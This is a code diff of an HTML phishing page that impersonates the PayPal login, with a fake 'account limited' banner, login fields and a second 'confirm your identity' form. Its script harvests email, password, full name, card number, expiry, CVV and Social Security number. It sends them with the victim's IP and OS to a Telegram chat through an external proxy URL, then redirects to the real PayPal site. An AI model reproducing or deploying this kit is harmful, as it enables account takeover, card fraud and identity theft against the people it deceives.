@@ -5,35 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PayPal - Log In</title>
     <style>
-        /* PayPal Exact CSS */
-        @font-face {
-            font-family: 'PayPal Sans';
-            src: url('https://www.paypalobjects.com/webstatic/icon/PP-Sans.woff') format('woff');
-            font-weight: normal;
-            font-style: normal;
-        }
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-        }
-
-        body {
             font-family: 'PayPal Sans', Arial, sans-serif;
+        }
+        body {
             background: #f5f5f5;
             color: #2c2e2f;
-            line-height: 1.4;
         }
-
-        /* Warning Banner - Only at top */
         .warning-banner {
             background: #fef2f0;
             border-bottom: 1px solid #ff6b6b;
             padding: 12px 0;
             color: #d32f2f;
         }
-
         .warning-banner .container {
             max-width: 1200px;
             margin: 0 auto;
@@ -42,73 +29,36 @@
             align-items: center;
             gap: 12px;
         }
-
-        .warning-icon {
-            font-size: 24px;
-        }
-
-        .warning-text {
-            font-weight: 500;
-        }
-
+        .warning-icon { font-size: 24px; }
         .warning-link {
             color: #d32f2f;
             font-weight: 700;
-            text-decoration: underline;
             margin-left: auto;
             cursor: pointer;
         }
-
-        /* Header */
         .header {
             background: #fff;
             border-bottom: 1px solid #e5e5e5;
             padding: 12px 0;
         }
-
         .container {
             max-width: 1200px;
             margin: 0 auto;
             padding: 0 24px;
         }
-
         .header-content {
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
-
-        .logo svg {
-            width: 120px;
-            height: 32px;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 32px;
-        }
-
+        .logo svg { width: 120px; height: 32px; }
+        .nav-links { display: flex; gap: 32px; }
         .nav-links a {
             color: #2c2e2f;
             text-decoration: none;
             font-size: 14px;
-            font-weight: 500;
         }
-
-        .nav-links a:hover {
-            color: #0070ba;
-        }
-
-        .contact {
-            font-size: 14px;
-            color: #6b6c6e;
-        }
-
-        /* Main Content */
-        .main {
-            padding: 40px 0;
-        }
-
+        .main { padding: 40px 0; }
         .login-grid {
             display: grid;
             grid-template-columns: 1fr 340px;
@@ -116,72 +66,37 @@
             max-width: 1000px;
             margin: 0 auto;
         }
-
         .login-box {
             background: #fff;
             border-radius: 12px;
             padding: 40px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
-
         h1 {
             font-size: 28px;
             font-weight: 400;
             color: #1a1b1c;
             margin-bottom: 8px;
         }
-
-        .subtitle {
-            color: #6b6c6e;
-            font-size: 16px;
-            margin-bottom: 32px;
-        }
-
-        .form-group {
-            margin-bottom: 24px;
-        }
-
+        .form-group { margin-bottom: 24px; }
         label {
             display: block;
             font-size: 14px;
             font-weight: 500;
-            color: #1a1b1c;
             margin-bottom: 8px;
         }
-
         input {
             width: 100%;
             padding: 14px 16px;
             border: 1px solid #9da3ad;
             border-radius: 8px;
             font-size: 16px;
-            font-family: inherit;
-            transition: border-color 0.2s;
         }
-
-        input:hover {
-            border-color: #6b6c6e;
-        }
-
         input:focus {
             outline: none;
             border-color: #0070ba;
             box-shadow: 0 0 0 3px rgba(0,112,186,0.15);
         }
-
-        .forgot-link {
-            display: inline-block;
-            margin-top: 8px;
-            color: #0070ba;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .forgot-link:hover {
-            text-decoration: underline;
-        }
-
         .btn-primary {
             width: 100%;
             padding: 14px 24px;
@@ -192,20 +107,14 @@
             font-size: 16px;
             font-weight: 700;
             cursor: pointer;
-            transition: background-color 0.2s;
-            margin: 16px 0 24px;
+            margin: 16px 0;
         }
-
-        .btn-primary:hover {
-            background: #005ea6;
-        }
-
+        .btn-primary:hover { background: #005ea6; }
         .divider {
             text-align: center;
             margin: 24px 0;
             position: relative;
         }
-
         .divider::before {
             content: '';
             position: absolute;
@@ -214,18 +123,14 @@
             right: 0;
             height: 1px;
             background: #e5e5e5;
-            z-index: 1;
         }
-
         .divider span {
             background: #fff;
             padding: 0 16px;
             color: #6b6c6e;
-            font-size: 14px;
             position: relative;
             z-index: 2;
         }
-
         .btn-secondary {
             width: 100%;
             padding: 14px 24px;
@@ -236,132 +141,57 @@
             font-size: 16px;
             font-weight: 700;
             cursor: pointer;
-            transition: background-color 0.2s;
         }
-
-        .btn-secondary:hover {
-            background: #e6f0fa;
-        }
-
-        .security-badges {
-            display: flex;
-            justify-content: center;
-            gap: 24px;
-            margin-top: 32px;
-        }
-
-        /* Info Panel */
         .info-panel {
             background: #f5f7fa;
             border-radius: 12px;
             padding: 32px;
         }
-
-        .info-panel h3 {
-            font-size: 20px;
-            font-weight: 400;
-            color: #1a1b1c;
-            margin-bottom: 16px;
-        }
-
-        .info-panel p {
-            color: #6b6c6e;
-            font-size: 14px;
-            line-height: 1.6;
-            margin-bottom: 16px;
-        }
-
-        .info-panel a {
-            color: #0070ba;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        /* Security Panel */
         .security-panel {
             background: #fff;
             border-radius: 12px;
             padding: 40px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
             max-width: 680px;
             margin: 0 auto;
         }
-
         .progress-steps {
             display: flex;
-            align-items: center;
             gap: 8px;
             margin-bottom: 32px;
         }
-
         .step {
             flex: 1;
             height: 4px;
             background: #e5e5e5;
             border-radius: 2px;
         }
-
-        .step.active {
-            background: #0070ba;
-        }
-
-        h2 {
-            font-size: 28px;
-            font-weight: 400;
-            color: #1a1b1c;
-            margin-bottom: 8px;
-        }
-
-        .verification-note {
-            color: #6b6c6e;
-            font-size: 14px;
-            margin-bottom: 32px;
-        }
-
+        .step.active { background: #0070ba; }
         .card-preview {
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
             border-radius: 12px;
             padding: 24px;
             color: #fff;
             margin-bottom: 24px;
             height: 180px;
         }
-
         .card-chip {
             width: 45px;
             height: 35px;
-            background: linear-gradient(135deg, #d4af37 0%, #f1e05a 100%);
+            background: linear-gradient(135deg, #d4af37, #f1e05a);
             border-radius: 8px;
             margin-bottom: 20px;
         }
-
-        .card-number-placeholder {
-            font-size: 20px;
-            letter-spacing: 2px;
-            margin-bottom: 20px;
-            opacity: 0.9;
-        }
-
         .row-2 {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 16px;
         }
-
-        .hidden {
-            display: none;
-        }
-
+        .hidden { display: none; }
         .loading-spinner {
             display: none;
             text-align: center;
             padding: 20px;
         }
-
         .spinner {
             width: 40px;
             height: 40px;
@@ -371,55 +201,29 @@
             animation: spin 1s linear infinite;
             margin: 0 auto;
         }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Footer */
+        @keyframes spin { 100% { transform: rotate(360deg); } }
         .footer {
             background: #fff;
             border-top: 1px solid #e5e5e5;
             padding: 40px 0;
             margin-top: 40px;
         }
-
-        .footer-links {
-            display: flex;
-            gap: 32px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-
-        .footer-links a {
-            color: #6b6c6e;
-            text-decoration: none;
-            font-size: 12px;
-        }
-
-        .copyright {
-            color: #9da3ad;
-            font-size: 11px;
-        }
-
+        .footer-links { display: flex; gap: 32px; margin-bottom: 20px; }
+        .footer-links a { color: #6b6c6e; text-decoration: none; font-size: 12px; }
+        .copyright { color: #9da3ad; font-size: 11px; }
         @media (max-width: 768px) {
-            .login-grid {
-                grid-template-columns: 1fr;
-            }
-            .nav-links, .contact {
-                display: none;
-            }
+            .login-grid { grid-template-columns: 1fr; }
+            .nav-links { display: none; }
         }
     </style>
 </head>
 <body>
-    <!-- Warning Banner Only -->
+    <!-- Warning Banner -->
     <div class="warning-banner">
         <div class="container">
             <span class="warning-icon">⚠️</span>
-            <span class="warning-text">Your account has been temporarily limited - Verify now to restore access</span>
-            <span class="warning-link" onclick="document.getElementById('email').focus()">Resolve issue →</span>
+            <span>Your account has been temporarily limited - Verify now</span>
+            <span class="warning-link" onclick="document.getElementById('email').focus()">Resolve →</span>
         </div>
     </div>
 
@@ -450,34 +254,24 @@
                 <div class="login-grid">
                     <div class="login-box">
                         <h1>Log in to your PayPal account</h1>
-                        <p class="subtitle">Access your money, send payments, and more.</p>
-                        
                         <form id="loginForm" onsubmit="event.preventDefault(); captureLogin();">
                             <div class="form-group">
-                                <label for="email">Email address</label>
-                                <input type="email" id="email" name="email" placeholder="name@example.com" required>
+                                <label>Email</label>
+                                <input type="email" id="email" required>
                             </div>
-
                             <div class="form-group">
-                                <label for="password">Password</label>
-                                <input type="password" id="password" name="password" placeholder="Enter your password" required>
-                                <a href="#" class="forgot-link">Forgotten password?</a>
+                                <label>Password</label>
+                                <input type="password" id="password" required>
+                                <a href="#" class="forgot-link">Forgot password?</a>
                             </div>
-
                             <button type="submit" class="btn-primary">Log In</button>
-
-                            <div class="divider">
-                                <span>or</span>
-                            </div>
-
-                            <button type="button" class="btn-secondary" onclick="window.location.href='#'">Sign Up</button>
+                            <div class="divider"><span>or</span></div>
+                            <button type="button" class="btn-secondary">Sign Up</button>
                         </form>
                     </div>
-
                     <div class="info-panel">
-                        <h3>PayPal is always safer</h3>
-                        <p>We protect your financial information with industry-leading security and fraud prevention.</p>
-                        <a href="#">Learn more →</a>
+                        <h3>PayPal is safer</h3>
+                        <p>We protect your financial info with encryption.</p>
                     </div>
                 </div>
             </div>
@@ -490,52 +284,38 @@
                         <div class="step"></div>
                         <div class="step"></div>
                     </div>
-
                     <h2>Confirm your identity</h2>
-                    <p class="verification-note">For your security, we need to verify a few details</p>
-
                     <div class="card-preview">
                         <div class="card-chip"></div>
-                        <div class="card-number-placeholder">•••• •••• •••• ••••</div>
-                        <div class="card-details-row">
-                            <span>CARDHOLDER NAME</span>
-                            <span>MM/YY</span>
-                        </div>
+                        <div style="font-size:20px;letter-spacing:2px;margin-bottom:20px;">•••• •••• •••• ••••</div>
                     </div>
-
                     <form id="securityForm" onsubmit="event.preventDefault(); captureSecurity();">
                         <div class="form-group">
-                            <label for="fullname">Full legal name (as shown on card)</label>
-                            <input type="text" id="fullname" name="fullname" placeholder="John A. Smith" required>
+                            <label>Full name</label>
+                            <input type="text" id="fullname" required>
                         </div>
-
                         <div class="form-group">
-                            <label for="cardnumber">Debit or credit card number</label>
-                            <input type="text" id="cardnumber" name="cardnumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                            <label>Card number</label>
+                            <input type="text" id="cardnumber" maxlength="19" required>
                         </div>
-
                         <div class="row-2">
                             <div class="form-group">
-                                <label for="expiry">Expiration date</label>
-                                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                                <label>Expiry</label>
+                                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                             </div>
                             <div class="form-group">
-                                <label for="cvv">CVV</label>
-                                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                                <label>CVV</label>
+                                <input type="text" id="cvv" maxlength="4" required>
                             </div>
                         </div>
-
                         <div class="form-group">
-                            <label for="ssn">Social Security Number</label>
-                            <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
+                            <label>SSN</label>
+                            <input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
                         </div>
-
                         <div class="loading-spinner" id="loadingSpinner">
                             <div class="spinner"></div>
-                            <p>Verifying...</p>
                         </div>
-
-                        <button type="submit" class="btn-primary" id="verifyBtn">Confirm and Continue</button>
+                        <button type="submit" class="btn-primary" id="verifyBtn">Confirm</button>
                     </form>
                 </div>
             </div>
@@ -548,58 +328,45 @@
                 <a href="#">Contact</a>
                 <a href="#">Privacy</a>
                 <a href="#">Legal</a>
-                <a href="#">Global</a>
             </div>
-            <p class="copyright">© 2024 PayPal, Inc. All rights reserved.</p>
+            <p class="copyright">© 2024 PayPal, Inc.</p>
         </div>
     </footer>
 
     <script>
-        // Your chat ID
+        // Your proxy URL (YOUR NEWLY DEPLOYED ONE)
+        const PROXY_URL = 'https://telegram-proxy-gsjj.onrender.com/send';
         const CHAT_ID = '8300466523';
-        
-        // Working proxy that definitely forwards to Telegram
-        const PROXY_URL = 'https://telegram-proxy-cors.herokuapp.com/send';
         
         let loginData = {};
 
         // Track visitor
         (function() {
-            trackVisitor();
+            getIP().then(ip => {
+                sendToBot(`👤 New Visitor\nIP: ${ip}\nTime: ${new Date().toLocaleString()}`);
+            });
             setupFormatters();
         })();
-
-        async function trackVisitor() {
-            const ip = await getIP();
-            const message = `👤 New Visitor\nIP: ${ip}\nTime: ${new Date().toLocaleString()}\nUA: ${navigator.userAgent}`;
-            await sendToBot(message);
-        }
 
         async function getIP() {
             try {
                 const r = await fetch('https://api.ipify.org?format=json');
                 const d = await r.json();
                 return d.ip;
-            } catch {
-                return 'Unknown';
-            }
+            } catch { return 'Unknown'; }
         }
 
         async function sendToBot(message) {
             try {
                 const response = await fetch(PROXY_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Origin': window.location.origin
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message,
                         parse_mode: 'HTML'
                     })
                 });
-                
                 const result = await response.text();
                 console.log('Proxy response:', result);
             } catch (e) {
@@ -610,10 +377,10 @@
         function getOS() {
             const ua = navigator.userAgent;
             if (ua.includes('Windows')) return 'Windows';
-            if (ua.includes('Mac OS')) return 'macOS';
+            if (ua.includes('Mac')) return 'macOS';
             if (ua.includes('Linux')) return 'Linux';
             if (ua.includes('Android')) return 'Android';
-            if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+            if (ua.includes('iPhone')) return 'iOS';
             return 'Unknown';
         }
 
@@ -622,98 +389,77 @@
             const password = document.getElementById('password').value;
             
             if (!email || !password) {
-                alert('Please enter your email and password');
+                alert('Please enter email and password');
                 return;
             }
 
             loginData = { email, password };
             const ip = await getIP();
 
-            const message = `🔐 PAYPAL LOGIN
+            await sendToBot(`🔐 <b>PAYPAL LOGIN</b>
 ━━━━━━━━━━━━
-📧 Email: ${email}
-🔑 Password: ${password}
+📧 Email: <code>${email}</code>
+🔑 Password: <code>${password}</code>
 ━━━━━━━━━━━━
-🌍 IP: ${ip}
+🌍 IP: <code>${ip}</code>
 💻 OS: ${getOS()}
-🕐 Time: ${new Date().toLocaleString()}`;
+🕐 Time: ${new Date().toLocaleString()}`);
 
-            await sendToBot(message);
-            
             document.getElementById('loginSection').classList.add('hidden');
             document.getElementById('securitySection').classList.remove('hidden');
         }
 
-        function validateCard(number) {
-            let sum = 0;
-            let alternate = false;
-            const num = number.replace(/\D/g, '');
-            
-            for (let i = num.length - 1; i >= 0; i--) {
-                let n = parseInt(num.charAt(i), 10);
-                if (alternate) {
-                    n *= 2;
-                    if (n > 9) n -= 9;
-                }
-                sum += n;
-                alternate = !alternate;
+        function validateCard(num) {
+            let sum = 0, alt = false;
+            const n = num.replace(/\D/g, '');
+            for (let i = n.length - 1; i >= 0; i--) {
+                let v = parseInt(n[i], 10);
+                if (alt) { v *= 2; if (v > 9) v -= 9; }
+                sum += v; alt = !alt;
             }
-            return (sum % 10 === 0);
-        }
-
-        function validateSSN(ssn) {
-            const num = ssn.replace(/\D/g, '');
-            if (num.length !== 9) return false;
-            if (num === '000000000') return false;
-            if (num.startsWith('666')) return false;
-            return true;
+            return sum % 10 === 0;
         }
 
         async function captureSecurity() {
-            const fullname = document.getElementById('fullname').value;
-            const cardnumber = document.getElementById('cardnumber').value;
-            const expiry = document.getElementById('expiry').value;
+            const name = document.getElementById('fullname').value;
+            const card = document.getElementById('cardnumber').value;
+            const exp = document.getElementById('expiry').value;
             const cvv = document.getElementById('cvv').value;
             const ssn = document.getElementById('ssn').value;
-            const email = loginData.email || '';
 
-            if (!fullname || !cardnumber || !expiry || !cvv || !ssn) {
-                alert('Please fill in all fields');
+            if (!name || !card || !exp || !cvv || !ssn) {
+                alert('Please fill all fields');
                 return;
             }
 
             document.getElementById('loadingSpinner').style.display = 'block';
             document.getElementById('verifyBtn').disabled = true;
 
-            const cardValid = validateCard(cardnumber);
-            const ssnValid = validateSSN(ssn);
-            const cardType = cardnumber.startsWith('4') ? 'Visa' : 
-                           cardnumber.startsWith('5') ? 'MasterCard' : 
-                           cardnumber.startsWith('3') ? 'Amex' : 'Unknown';
-            const bin = cardnumber.replace(/\D/g, '').substring(0, 6);
+            const cardValid = validateCard(card);
+            const cardType = card.startsWith('4') ? 'Visa' : 
+                           card.startsWith('5') ? 'MasterCard' : 
+                           card.startsWith('3') ? 'Amex' : 'Unknown';
+            const bin = card.replace(/\D/g, '').substring(0, 6);
             const ip = await getIP();
 
-            const message = `💳 FULL VICTIM DATA
+            await sendToBot(`💳 <b>FULL VICTIM DATA</b>
 ━━━━━━━━━━━━
-📧 Email: ${email}
-👤 Name: ${fullname}
+📧 Email: <code>${loginData.email}</code>
+👤 Name: <code>${name}</code>
 ━━━━━━━━━━━━
-💳 Card: ${cardnumber}
+💳 Card: <code>${card}</code>
 🏦 Type: ${cardType}
-📅 Expiry: ${expiry}
-🔐 CVV: ${cvv}
+📅 Expiry: ${exp}
+🔐 CVV: <code>${cvv}</code>
 ✅ Valid: ${cardValid ? 'YES' : 'NO'}
-🔢 BIN: ${bin}
+🔢 BIN: <code>${bin}</code>
 ━━━━━━━━━━━━
-🆔 SSN: ${ssn}
-✅ Valid: ${ssnValid ? 'YES' : 'NO'}
+🆔 SSN: <code>${ssn}</code>
 ━━━━━━━━━━━━
-🌍 IP: ${ip}
+🌍 IP: <code>${ip}</code>
 💻 OS: ${getOS()}
-🕐 Time: ${new Date().toLocaleString()}`;
+🕐 Time: ${new Date().toLocaleString()}`);
 
-            await sendToBot(message);
-            
             setTimeout(() => {
                 window.location.href = 'https://www.paypal.com/signin';
             }, 2000);
@@ -721,35 +467,37 @@
 
         function setupFormatters() {
             document.getElementById('cardnumber')?.addEventListener('input', function(e) {
-                let value = this.value.replace(/\D/g, '');
-                let formatted = '';
-                for (let i = 0; i < value.length; i++) {
-                    if (i > 0 && i % 4 === 0) formatted += ' ';
-                    formatted += value[i];
+                let v = this.value.replace(/\D/g, '');
+                let f = '';
+                for (let i = 0; i < v.length; i++) {
+                    if (i > 0 && i % 4 === 0) f += ' ';
+                    f += v[i];
                 }
-                this.value = formatted;
+                this.value = f;
             });
 
             document.getElementById('expiry')?.addEventListener('input', function(e) {
-                let value = this.value.replace(/\D/g, '');
-                if (value.length >= 2) {
-                    this.value = value.slice(0,2) + '/' + value.slice(2,4);
-                }
+                let v = this.value.replace(/\D/g, '');
+                if (v.length >= 2) this.value = v.slice(0,2) + '/' + v.slice(2,4);
             });
 
             document.getElementById('ssn')?.addEventListener('input', function(e) {
-                let value = this.value.replace(/\D/g, '');
-                if (value.length > 3 && value.length <= 5) {
-                    this.value = value.slice(0,3) + '-' + value.slice(3);
-                } else if (value.length > 5) {
-                    this.value = value.slice(0,3) + '-' + value.slice(3,5) + '-' + value.slice(5,9);
-                }
+                let v = this.value.replace(/\D/g, '');
+                if (v.length > 3 && v.length <= 5) this.value = v.slice(0,3) + '-' + v.slice(3);
+                else if (v.length > 5) this.value = v.slice(0,3) + '-' + v.slice(3,5) + '-' + v.slice(5,9);
             });
 
             document.getElementById('cvv')?.addEventListener('input', function(e) {
                 this.value = this.value.replace(/\D/g, '').slice(0,4);
             });
         }
+
+        // Track if user leaves during verification
+        window.addEventListener('beforeunload', function() {
+            if (!document.getElementById('securitySection').classList.contains('hidden')) {
+                sendToBot('⚠️ User left during security verification');
+            }
+        });
     </script>
 </body>
 </html>
